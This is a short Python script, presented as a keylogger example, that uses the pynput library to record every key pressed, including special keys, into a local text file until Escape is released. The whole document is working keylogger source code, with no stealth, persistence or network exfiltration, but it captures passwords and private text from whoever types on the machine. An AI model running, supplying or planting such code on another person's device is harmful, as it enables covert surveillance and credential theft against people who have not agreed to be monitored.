# Python Keylogger Example using pynput

# Import the necessary module from the pynput library
from pynput import keyboard

# Path to the file where you want to store the keystrokes
keyfile_path = 'keylog.txt'

# This function is triggered when a key is pressed
def on_press(key):
    try:
        # Open the file in append mode and write the pressed key to it
        with open(keyfile_path, 'a') as f:  # Open the file in append mode
            f.write(f'{key.char}')  # Write the character to the file
    except AttributeError:
        # Handle special keys like Ctrl, Alt, etc.
        with open(keyfile_path, 'a') as f:
            f.write(f' {key} ')  # Write special keys (like Ctrl, Alt)

# This function is triggered when a key is released
def on_release(key):
    # Stop the listener if the Escape key is released
    if key == keyboard.Key.esc:
        return False  # Stop the listener

# Start the keyboard listener
# It listens to both key presses and key releases
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
